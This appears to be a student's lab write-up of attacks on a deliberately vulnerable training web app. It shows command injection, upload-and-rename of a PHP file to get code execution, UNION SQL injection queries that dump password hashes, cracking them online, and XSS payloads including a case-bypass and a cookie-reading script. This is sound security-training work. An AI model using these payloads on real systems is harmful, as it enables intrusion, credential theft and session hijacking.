Command Execution:

found admin login searching through files of the server.

& find ../../../ -type f
& cat ../../../medium/websec/includes/DBMS/MySQL.php.old
outuput:

[...]
$insert = "INSERT INTO users VALUES
	('1','admin','admin','admin',MD5('password'),'{$baseUrl}admin.jpg'),
	('2','Gordon','Brown','gordonb',MD5('abc123'),'{$baseUrl}gordonb.jpg'),
	('3','Hack','Me','1337',MD5('charley'),'{$baseUrl}1337.jpg'),
	('4','Pablo','Picasso','pablo',MD5('letmein'),'{$baseUrl}pablo.jpg'),
	('5','Bob','Smith','smithy',MD5('password'),'{$baseUrl}smithy.jpg');";
[...]

Tried logging in as admin and it worked.


Command execution & file upload & file inclusion:

1. Upload arbitrary file with malicious content name as *.jpeg
  It can be  a .htaccess file or a shell script or even a php file
  Everything renamed as .jpeg
  I did it with exploit.php as .jpeg which is just an example

2. Command execution
  Use the ping part of the server to execute arbitrary commands and rename the file:
  ex: & mv ../../hackable/uploads/exploit.jpeg ../../hackable/uploads/exploit.php

3. File inclusion
  Use this page to acces the file you have uploaded and execute PHP code
  Use the Command execution page to run you script
  Obs: I changed the .htacess file but the changes seemed to not be effective, I'm not sure why.


Vulnerability: SQL Injection (Blind)

1. Fill the field with this string: 1 or 1=1 UNION SELECT table_name, table_name FROM INFORMATION_SCHEMA.TABLES

2. Find a interesting table (ex:Hack) and fill 1 or 1=1 UNION SELECT table_name, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS

3. Looking at the columns/table names I found users.password, selectin it I could get the passwords from the users as well,
 but they are stored as hash, so in this way I can't login as them.

1 or 1=1 UNION SELECT user, password FROM users

4. But actually, using this site: https://www.md5online.org/

I could find all the passwords(again), and now with the certainty that they are correct without login with everyone:
user:admin
password:password

user:gordonb
password:abc123

user:1337
password:charley

user:Pablo
password:letmein

user:smithy
password:password


Vulnerability: Reflected Cross Site Scripting (XSS)

1. Paste your script in the name field

2. Press submit

3. Script is executed.

Ex:<script type='text/javascript'>alert('Hello');</script>


Vulnerability: Stored Cross Site Scripting

1. Change maxLength of input tag named "txtName"

2. Type/paste your script like this: <Script>yourscripthere</script>

3. FIll in a nice message :)

4. Submit

Explanation: This will bypass the security check because only the field message is sanitized correctly,
name field only checks for the string "<script>" and removes it, if it's present.

Example:
<Script>alert('Hello');</script>



----------------------

In this example the cookie value is shown in the console.log field.

Verbose version:

http://10.0.23.21/vulnerabilities/xss_r/?name=Test<script type='text/javascript'>
var cookie_name = "PHPSESSID";
var match = document.cookie.match(new RegExp('(^| )' + cookie_name + '=([^;]+)'));
  if (match)
  console.log(match[2]);
</script>

Encoded URL
http://10.0.23.21/vulnerabilities/xss_r/?name=Test%3Cscript+type%3D%27text%2Fjavascript%27%3E%0D%0Avar+cookie_name+%3D+%22PHPSESSID%22%3B%0D%0Avar+match+%3D+document.cookie.match%28new+RegExp%28%27%28%5E%7C+%29%27+%2B+cookie_name+%2B+%27%3D%28%5B%5E%3B%5D%2B%29%27%29%29%3B%0D%0Aif+%28match%29%0D%0Aconsole.log%28match%5B2%5D%29%3B%0D%0A%3C%2Fscript%3E%0D%0A
